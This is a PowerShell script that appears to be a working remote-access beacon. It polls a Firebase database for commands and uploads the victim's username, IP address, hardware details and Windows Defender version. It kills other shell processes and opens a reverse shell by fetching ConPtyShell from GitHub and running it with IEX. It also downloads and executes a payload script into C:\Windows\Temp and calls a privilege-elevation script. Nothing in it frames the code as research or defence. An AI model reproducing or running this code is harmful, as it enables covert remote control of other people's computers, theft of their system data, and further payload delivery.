# PING the Firebase Realtime Database (url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/PING")

while ($true) {
    $primaryAdapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Sort-Object -Property InterfaceIndex | Select-Object -First 1
    $url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/$($primaryAdapter.MacAddress)/state.json"
    $pingUrl = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/PING.json"
    $delayUrl = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/delay.json"
    $response = Invoke-RestMethod -Uri $url
    $state = $response
    $ping = Invoke-RestMethod -Uri $pingUrl
    $delay = Invoke-RestMethod -Uri $delayUrl

    # Write-Output ("State type: " + $state.GetType().FullName)

    if ($state -eq "null") {
        Get-Process -Name powershell, cmd | Where-Object { $_.Id -ne $PID } | Stop-Process -Force
        # cUrl the data to the Firebase Realtime Database
        $stateChild = @{
            "state" = 0
        } | ConvertTo-Json
        # PUT the data to the Firebase Realtime Database
        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
        # echo "State is null"

        # Get the primary network adapter
        $primaryAdapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Sort-Object -Property InterfaceIndex | Select-Object -First 1
        # Get Device username
        $deviceUsername = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName).Split('\')[1]
        # Get Device private IP address
        $deviceIP = (Get-NetIPAddress -InterfaceIndex $primaryAdapter.InterfaceIndex -AddressFamily IPv4).IPAddress
        # Get Device Brand
        $deviceBrand = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)
        # Get Device Model
        $deviceModel = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model)
        # Get Device Windows Defender version
        $defenderVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates" -Name "EngineVersion").EngineVersion

        # cUrl the data to the Firebase Realtime Database
        $recon = @{
            "User" = $deviceUsername
            "IP" = $deviceIP
            "Brand" = $deviceBrand
            "Model" = $deviceModel
            "Defender" = $defenderVersion
        } | ConvertTo-Json

        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '/recon.json') -Method PUT -Body $recon | Out-Null

        $ip = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/ip.json"
        $port = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/port.json"
        Start-Job {
            $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/ip.json)"
            $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/port.json)"
        
            IEX(
                IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
            )
        
            Invoke-ConPtyShell "$ip" "$port"
        } | Out-Null
    }

    elseif ($state -eq 1) {
        $ip = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/ip.json"
        $port = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/port.json"

        $owningProcesses = @(Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq $ip -and $_.RemotePort -eq $port } | Select-Object -ExpandProperty OwningProcess)
        [System.Array]::Reverse($owningProcesses)
        $firstProcess = $owningProcesses[0]

        # Write-Host "First Owning Process: $firstProcess"
        # Write-Host "Owning Processes: $owningProcesses"

        if ($owningProcesses.Length -ge 5) {
            for ($i = 1; $i -lt $owningProcesses.Length; $i++) {
                Stop-Process -Id $owningProcesses[$i]
            }
        }

        # If owningProcesses is null, start a job
        if ($firstProcess -eq $null) {
            Start-Job {
                $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/ip.json)"
                $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/port.json)"
            
                IEX(
                    IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
                )
            
                Invoke-ConPtyShell "$ip" "$port"
            } | Out-Null
        }
    }

    elseif ($ping -eq 1) {
        $stateChild = @{
            "LastSeen" = (Get-Date).ToString("HH:mm:ss dddd, dd MMMM yyyy")
        } | ConvertTo-Json
        # PUT the data to the Firebase Realtime Database
        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/Online/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
        start-sleep -Seconds $delay
    }

    elseif ($state -eq 2) {
        # PUT the data to the Firebase Realtime Database
        Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/side-project/dropPayload.ps1 > C:\Windows\Temp\dropPayload.ps1
        Invoke-Expression -Command "C:\Windows\Temp\dropPayload.ps1"
        $stateChild = @{
            "Update" = 1
        } | ConvertTo-Json
        # PUT the data to the Firebase Realtime Database
        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
        start-sleep -Seconds $delay
    }

    elseif ($state -eq 3) {
        Stop-Process -Id $owningProcesses[$i]
        C:\temp\beacon\elevate\Elevate.ps1
        $stateChild = @{
            "Update" = 1
        } | ConvertTo-Json
        # PUT the data to the Firebase Realtime Database
        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
        start-sleep -Seconds $delay
    }
    Start-Sleep -Seconds $delay
}
